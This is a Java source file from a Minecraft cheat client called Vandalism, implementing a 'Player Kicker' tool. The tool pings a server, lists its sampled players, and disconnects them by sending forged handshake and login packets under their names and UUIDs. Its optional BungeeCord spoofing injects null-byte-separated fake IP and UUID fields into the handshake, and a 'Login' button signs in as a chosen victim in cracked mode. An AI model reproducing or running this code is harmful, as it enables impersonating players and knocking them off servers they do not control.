/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Verschlxfene, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.clientwindow.impl;

import com.viaversion.viaversion.api.protocol.version.ProtocolVersion;
import com.viaversion.viaversion.api.protocol.version.VersionType;
import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.clientwindow.template.StateClientWindow;
import de.nekosarekawaii.vandalism.clientwindow.template.widgets.datalist.DataListWidget;
import de.nekosarekawaii.vandalism.clientwindow.template.widgets.datalist.dataentry.DataEntry;
import de.nekosarekawaii.vandalism.clientwindow.template.widgets.datalist.dataentry.impl.ListDataEntry;
import de.nekosarekawaii.vandalism.util.game.PacketHelper;
import de.nekosarekawaii.vandalism.util.game.PingState;
import de.nekosarekawaii.vandalism.util.game.server.ServerUtil;
import de.nekosarekawaii.vandalism.integration.imgui.ImUtils;
import imgui.ImGui;
import imgui.flag.ImGuiComboFlags;
import imgui.type.ImBoolean;
import imgui.type.ImInt;
import imgui.type.ImString;
import net.lenni0451.mcping.MCPing;
import net.lenni0451.mcping.exception.ConnectTimeoutException;
import net.lenni0451.mcping.exception.ConnectionRefusedException;
import net.lenni0451.mcping.exception.DataReadException;
import net.lenni0451.mcping.exception.PacketReadException;
import net.lenni0451.mcping.responses.MCPingResponse;
import net.minecraft.SharedConstants;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.util.Pair;

import java.io.DataOutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PlayerKickerClientWindow extends StateClientWindow implements DataListWidget {

    private final ImString ip = new ImString(253);
    private final ImInt port = new ImInt(25565);
    private final ImBoolean preventSelfKick = new ImBoolean(true);
    private final ImBoolean preventFriendKick = new ImBoolean(true);
    private final ImBoolean spoofBungeeCord = new ImBoolean(false);
    private final ImBoolean customizeIP = new ImBoolean(false);
    private final ImString customIP = new ImString();
    private final ImInt kickDelay = new ImInt(2000);

    private boolean checking = false;
    private MCPingResponse.Players players = null;
    private int protocol = SharedConstants.getProtocolVersion();
    private int friends = 0;
    private int anonymousPlayers = 0;

    private final ExecutorService executorService = Executors.newSingleThreadExecutor();

    private final CopyOnWriteArrayList<ListDataEntry> playerDataEntries = new CopyOnWriteArrayList<>();

    public PlayerKickerClientWindow() {
        super("Player Kicker", Category.SERVER);
    }

    @Override
    protected void onRender(final DrawContext context, final int mouseX, final int mouseY, final float delta) {
        super.onRender(context, mouseX, mouseY, delta);
        final String id = "##" + this.getName();
        if (!this.checking) {
            ImGui.text("IP");
            ImGui.setNextItemWidth(-1);
            ImGui.inputText(id + "IP", this.ip);
            if (this.ip.isEmpty()) {
                if (ImUtils.subButton("Use " + (this.mc.player != null ? "Current" : "Last") + " Server" + id + "useLastOrCurrentServer")) {
                    final ServerInfo currentServerInfo = ServerUtil.getLastServerInfo();
                    if (ServerUtil.lastServerExists()) {
                        this.ip.set(currentServerInfo.address);
                    }
                }
            }
            ImGui.text("Port");
            ImGui.setNextItemWidth(-1);
            ImGui.inputInt(id + "Port", this.port);
            ImGui.checkbox("Prevent Self Kick" + id + "preventSelfKick", this.preventSelfKick);
            ImGui.sameLine();
            ImGui.textDisabled("(?)");
            if (ImGui.isItemHovered()) {
                ImGui.beginTooltip();
                ImGui.text("Red highlighted");
                ImGui.endTooltip();
            }
            ImGui.sameLine();
            ImGui.checkbox("Prevent Friend Kick" + id + "preventFriendKick", this.preventFriendKick);
            ImGui.sameLine();
            ImGui.textDisabled("(?)");
            if (ImGui.isItemHovered()) {
                ImGui.beginTooltip();
                ImGui.text("Orange highlighted");
                ImGui.endTooltip();
            }
            ImGui.sameLine();
            ImGui.checkbox("Spoof BungeeCord" + id + "spoofBungeeCord", this.spoofBungeeCord);
            if (this.spoofBungeeCord.get()) {
                ImGui.sameLine();
                ImGui.checkbox("Customize IP" + id + "customizeIP", this.customizeIP);
                if (this.customizeIP.get()) {
                    ImGui.text("Custom IP");
                    ImGui.setNextItemWidth(-1);
                    ImGui.inputText(id + "customIP", this.customIP);
                }
            }
            ImGui.text("Version");
            ImGui.sameLine(ImGui.getColumnWidth() / 2f + 25f);
            ImGui.text("Kick Delay (ms)");
            ImGui.setNextItemWidth(ImGui.getColumnWidth() / 2f);
            if (ImGui.beginCombo(id + "version", ProtocolVersion.getProtocol(this.protocol).getName(), ImGuiComboFlags.HeightLargest)) {
                final List<Integer> protocols = new ArrayList<>();
                for (final ProtocolVersion protocolVersion : ProtocolVersion.getProtocols()) {
                    if (protocolVersion.getVersionType() == VersionType.RELEASE && protocolVersion.newerThanOrEqualTo(ProtocolVersion.v1_8) && !protocolVersion.equalTo(ProtocolVersion.v1_19) && !protocolVersion.equalTo(ProtocolVersion.v1_19_1)) {
                        protocols.add(protocolVersion.getVersion());
                    }
                }
                for (int i = protocols.size() - 1; i > -1; i--) {
                    final int protocol = protocols.get(i);
                    final String protocolVersionName = ProtocolVersion.getProtocol(protocol).getName();
                    if (ImGui.selectable(protocolVersionName, protocolVersionName.equals(ProtocolVersion.getProtocol(this.protocol).getName()))) {
                        this.protocol = protocol;
                    }
                }
                ImGui.endCombo();
            }
            ImGui.sameLine();
            ImGui.setNextItemWidth(-1);
            ImGui.inputInt(id + "delay", this.kickDelay);
            ImGui.spacing();
            if (this.ip.isNotEmpty()) {
                if (this.ip.get().contains(":")) {
                    final String[] split = this.ip.get().split(":");
                    this.ip.set(split[0]);
                    if (split.length > 1) {
                        try {
                            this.port.set(Integer.parseInt(split[1]));
                        } catch (final NumberFormatException ignored) {
                        }
                    }
                }
                if (ImUtils.subButton("Check" + id + "check")) {
                    this.checking = true;
                    this.setState(PingState.WAITING_RESPONSE.getMessage());
                    this.players = null;
                    this.friends = 0;
                    this.anonymousPlayers = 0;
                    this.playerDataEntries.clear();
                    MCPing.pingModern(SharedConstants.getProtocolVersion())
                            .address(this.ip.get(), this.port.get())
                            .timeout(5000, 5000)
                            .exceptionHandler(t -> {
                                this.checking = false;
                                switch (t) {
                                    case UnknownHostException unknownHostException ->
                                            this.setState(PingState.UNKNOWN_HOST.getMessage());
                                    case ConnectionRefusedException connectionRefusedException ->
                                            this.setState(PingState.CONNECTION_REFUSED.getMessage());
                                    case ConnectTimeoutException connectTimeoutException ->
                                            this.setState(PingState.CONNECTION_TIMED_OUT.getMessage());
                                    case DataReadException dataReadException ->
                                            this.setState(PingState.DATA_READ_FAILED.getMessage());
                                    case PacketReadException packetReadException ->
                                            this.setState(PingState.PACKET_READ_FAILED.getMessage());
                                    case null, default -> {
                                        this.setState(PingState.FAILED.getMessage());
                                        Vandalism.getInstance().getLogger().error("Failed to ping {}:{}", this.ip.get(), this.port.get(), t);
                                    }
                                }
                            }).finishHandler(response -> {
                                this.checking = false;
                                this.setState(PingState.SUCCESS.getMessage());
                                this.players = response.players;
                                if (this.players != null && this.players.sample != null) {
                                    final MCPingResponse.Players.Player[] sample = this.players.sample;
                                    if (sample.length == 0) {
                                        this.players = null;
                                        return;
                                    }
                                    for (final MCPingResponse.Players.Player player : sample) {
                                        if (ServerUtil.isAnonymous(player.name, player.id)) {
                                            this.anonymousPlayers++;
                                        } else if (Vandalism.getInstance().getFriendsManager().isFriend(player.name)) {
                                            this.friends++;
                                        }
                                        final CopyOnWriteArrayList<Pair<String, String>> list = new CopyOnWriteArrayList<>();
                                        list.add(new Pair<>("Name", player.name));
                                        list.add(new Pair<>("UUID", player.id));
                                        this.playerDataEntries.add(new ListDataEntry(list));
                                    }
                                }
                                this.delayedResetState(10000);
                            }).getAsync();
                }
            }
            ImGui.separator();
            if (this.players != null && this.players.sample != null) {
                ImGui.textWrapped("Players: " + this.players.online + "/" + this.players.max + " (" + this.players.sample.length + ")");
                if (this.anonymousPlayers > 0) {
                    ImGui.textWrapped("Anonymous Players: " + this.anonymousPlayers);
                }
                if (this.friends > 0) {
                    ImGui.textWrapped("Friends: " + this.friends);
                }
                this.renderDataList(id + "playerList", -ImGui.getTextLineHeightWithSpacing() - 10, 45f, this.playerDataEntries);
                if (ImGui.button("Kick All Players" + id + "kickAllPlayers", ImGui.getColumnWidth(), ImGui.getTextLineHeightWithSpacing())) {
                    for (final MCPingResponse.Players.Player player : this.players.sample) {
                        this.kickPlayer(player.name, player.id);
                    }
                }
            } else {
                ImGui.text("No players found.");
            }
        }
    }

    @Override
    public boolean filterDataEntry(final DataEntry dataEntry) {
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            final String name = listDataEntry.getFirst().getRight(), uuid = listDataEntry.getSecond().getRight();
            final boolean isSelf = ServerUtil.isSelf(name, uuid), isFriend = Vandalism.getInstance().getFriendsManager().isFriend(name);
            return ServerUtil.isAnonymous(name, uuid) || (isSelf && this.preventSelfKick.get()) || (isFriend && this.preventFriendKick.get());
        }
        return false;
    }

    @Override
    public boolean shouldHighlightDataEntry(final DataEntry dataEntry) {
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            final String name = listDataEntry.getFirst().getRight(), uuid = listDataEntry.getSecond().getRight();
            final boolean isSelf = ServerUtil.isSelf(name, uuid), isFriend = Vandalism.getInstance().getFriendsManager().isFriend(name);
            return isSelf || isFriend;
        }
        return false;
    }

    @Override
    public float[] getDataEntryHighlightColor(final DataEntry dataEntry) {
        float[] color = {0.8f, 0.1f, 0.1f, 0.30f};
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            if (Vandalism.getInstance().getFriendsManager().isFriend(listDataEntry.getFirst().getRight())) {
                color = new float[]{0.9f, 0.5f, 0.1f, 0.40f};
            }
        }
        return color;
    }

    @Override
    public void onDataEntryClick(final DataEntry dataEntry) {
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            this.kickPlayer(listDataEntry.getFirst().getRight(), listDataEntry.getSecond().getRight());
        }
    }

    @Override
    public void renderDataEntryContextMenu(final String id, final int index, final DataEntry dataEntry) {
        if (dataEntry instanceof final ListDataEntry listDataEntry) {
            final String name = listDataEntry.getFirst().getRight(), uuid = listDataEntry.getSecond().getRight();
            ImGui.text("Player: " + name);
            ImGui.separator();
            final int buttonWidth = 200, buttonHeight = 28;
            if (ImGui.button("Login" + id + "login", buttonWidth, buttonHeight)) {
                Vandalism.getInstance().getAccountManager().loginCracked(name, uuid);
            }
            if (ImGui.button("Copy Data" + id + "copyData", buttonWidth, buttonHeight)) {
                this.mc.keyboard.setClipboard(dataEntry.getData());
            }
        }
    }

    private void kickPlayer(final String name, final String uuid) {
        if ((ServerUtil.isSelf(name, uuid) && this.preventSelfKick.get()) || (Vandalism.getInstance().getFriendsManager().isFriend(name) && this.preventFriendKick.get())) {
            return;
        }
        this.executorService.submit(() -> {
            if (!name.isBlank() && !uuid.isBlank()) {
                try {
                    this.setState("Kicking player " + name + "...");
                    Thread.sleep(this.kickDelay.get());
                    final Socket connection = new Socket(this.ip.get(), this.port.get());
                    connection.setTcpNoDelay(true);
                    final DataOutputStream output = new DataOutputStream(connection.getOutputStream());
                    String ip = this.ip.get();
                    if (this.spoofBungeeCord.get()) {
                        ip += "\u0000";
                        if (this.customizeIP.get()) {
                            ip += this.customIP.get();
                        } else {
                            ip += PacketHelper.getRandomIpPart() + "." + PacketHelper.getRandomIpPart() + "." + PacketHelper.getRandomIpPart() + "." + PacketHelper.getRandomIpPart();
                        }
                        ip += "\u0000";
                        ip += uuid.replace("-", "");
                    }
                    PacketHelper.writePacket(PacketHelper.createHandshakePacket(ip, this.port.get(), this.protocol), output);
                    PacketHelper.writePacket(PacketHelper.createLoginPacket(this.protocol, name, UUID.fromString(uuid)), output);
                    Thread.sleep(1000);
                    connection.close();
                    this.setState("Player " + name + " should be kicked.");
                } catch (final Exception ignored) {
                    this.setState("Failed to kick player " + name + ".");
                }
            } else {
                this.setState("Invalid player data.");
            }
        });
    }

}
